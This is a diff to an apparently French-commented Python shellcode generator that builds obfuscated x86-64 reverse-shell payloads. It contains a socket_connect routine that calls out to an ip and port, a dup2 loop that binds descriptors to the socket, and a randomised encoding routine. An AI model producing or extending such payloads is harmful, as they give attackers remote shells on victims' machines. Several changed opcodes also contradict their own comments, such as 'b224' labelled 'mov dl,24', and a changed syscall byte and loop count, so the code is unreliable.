@@ -99,7 +99,7 @@ def factorOffus(string4Payload):
     #Ce tableau setted sera notre tableau de référence pour add ou sub une valeur à chaque double octet de notre string(elle, en hexa)
     theOneArr[:]= list(set(theOneArr))
 
-    rand = r(theOneArr[0],theOneArr[1]) #On choisie aléatoirement parmis les valeurs obtenue une seule valeur
+    rand = r(theOneArr[0],theOneArr[-1]) #On choisie aléatoirement parmis les valeurs obtenue une seule valeur
 
     #Si l'opérateur été "-", on rend positif la valeur choisie aléatoirement
     if ope == 1 :
@@ -331,7 +331,7 @@ def socket_connect(ip, port):
 
    # mov rsi, rsp | add rsi, rsp 
    add_string += "4889e6"                       #if r(0,1) else "4831f64801e6" 
-   add_string += "b218"             #   mov dl,24
+   add_string += "b224"             #   mov dl,24
    add_string += call()             #   syscall
 
    PAYLOAD += add_string
@@ -381,10 +381,10 @@ def deof_socket_connect(ip, port):
 def dup2x3():
     global PAYLOAD
     PAYLOAD += clean('rax')
-    for i in range(0,3):
-        PAYLOAD += "b03f"
+    for i in range(0,2):
+        PAYLOAD += "b033"
         PAYLOAD += "4c89d7"
-        if not(i):
+        if i == 0:
             PAYLOAD += clean('rsi')
         else:
             PAYLOAD += '48ffc6' # inc rsi
